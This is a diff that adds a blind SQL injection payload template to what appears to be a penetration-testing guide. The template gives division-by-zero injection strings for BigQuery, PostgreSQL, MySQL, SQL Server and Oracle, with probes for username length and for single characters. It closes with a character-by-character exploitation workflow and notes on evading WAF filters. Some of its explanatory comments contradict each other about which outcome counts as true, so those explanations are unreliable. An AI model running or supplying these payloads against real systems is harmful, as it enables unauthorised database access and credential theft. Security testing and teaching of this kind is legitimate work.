@@ -1363,3 +1363,100 @@ TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="U
 ```
 
 This complete workflow takes you from zero knowledge to full credential extraction across all major databases using OAST techniques with Burp Suite automation.
+```sql
+-- =============================================
+-- BLIND SQL INJECTION PAYLOAD TEMPLATE
+-- Using Division-by-Zero Error as Boolean Signal
+-- =============================================
+
+-- =============================================
+-- GOOGLE BIGQUERY (ORIGINAL)
+-- =============================================
+-- Payload to check if username length = 5
+location=test" OR if(1/(length((select username from users limit 1))-5)=1,true,false) or "a"="b"--
+
+-- Breakdown:
+-- location=test"          - Vulnerable parameter with test value
+-- OR if(                 - Start conditional check
+--     1/(                - Division operation (will cause error if divisor=0)
+--       length(          - Get string length
+--         (select username from users limit 1)  - Target data to extract
+--       )-5              - Subtract expected length (5)
+--     )=1,               - If result equals 1 (only happens with 1/0)
+--   true,false)          - Return true if division succeeds, false if error
+-- or "a"="b"            - Always false safety clause
+-- --                    - Comment out rest of query
+
+-- =============================================
+-- POSTGRESQL VERSION
+-- =============================================
+location=test' OR (1/(length((select username from users limit 1))-5))=1 OR 'a'='b'--
+
+-- =============================================
+-- MYSQL VERSION  
+-- =============================================
+location=test" OR (1/(length((select username from users limit 1))-5))=1 or "a"="b"--
+
+-- =============================================
+-- MICROSOFT SQL SERVER VERSION
+-- =============================================
+location=test' OR 1/(len((select top 1 username from users))-5)=1 OR 'a'='b'--
+
+-- =============================================
+-- ORACLE VERSION
+-- =============================================
+location=test' OR 1/(length((select username from users where rownum=1))-5)=1 OR 'a'='b'--
+
+-- =============================================
+-- CHARACTER EXTRACTION EXAMPLES
+-- =============================================
+
+-- Google BigQuery - Check if first character = 'a'
+location=test" OR if(1/(STRPOS((select username from users limit 1),'a')-1)=1,true,false) or "a"="b"--
+
+-- PostgreSQL - Check if first character = 'a'  
+location=test' OR (1/(POSITION('a' in (select username from users limit 1))-1))=1 OR 'a'='b'--
+
+-- MySQL - Check if first character = 'a'
+location=test" OR (1/(INSTR((select username from users limit 1),'a')-1))=1 or "a"="b"--
+
+-- SQL Server - Check if first character = 'a'
+location=test' OR 1/(CHARINDEX('a',(select top 1 username from users))-1)=1 OR 'a'='b'--
+
+-- Oracle - Check if first character = 'a'
+location=test' OR 1/(INSTR((select username from users where rownum=1),'a')-1)=1 OR 'a'='b'--
+
+-- =============================================
+-- HOW THE BOOLEAN LOGIC WORKS:
+-- =============================================
+
+-- SUCCESS CASE (Length actually is 5):
+-- 1/(5-5) = 1/0 = DIVISION BY ZERO ERROR = TRUE SIGNAL
+
+-- FAIL CASE (Length is not 5):
+-- 1/(6-5) = 1/1 = 1 = No error = FALSE SIGNAL
+
+-- SAFETY CLAUSE PURPOSE:
+-- "a"="b" is always false - prevents accidental data dump
+-- Ensures predictable behavior even when condition returns true
+
+-- =============================================
+-- EXPLOITATION WORKFLOW:
+-- =============================================
+
+-- 1. Find string length by testing numbers until error occurs
+--    Example: Try -5, -6, -7 until division error appears
+
+-- 2. Extract characters one by one using position functions  
+--    Example: Test 'a','b','c' at position 1, then position 2, etc.
+
+-- 3. Repeat for each character position until full string extracted
+
+-- =============================================
+-- WAF BYPASS NOTES:
+-- =============================================
+
+-- Uses database-specific functions to evade generic WAF rules
+-- Division-by-zero technique often bypasses keyword filters
+-- "a"="b" safety clause makes payload look more like legitimate SQL
+```
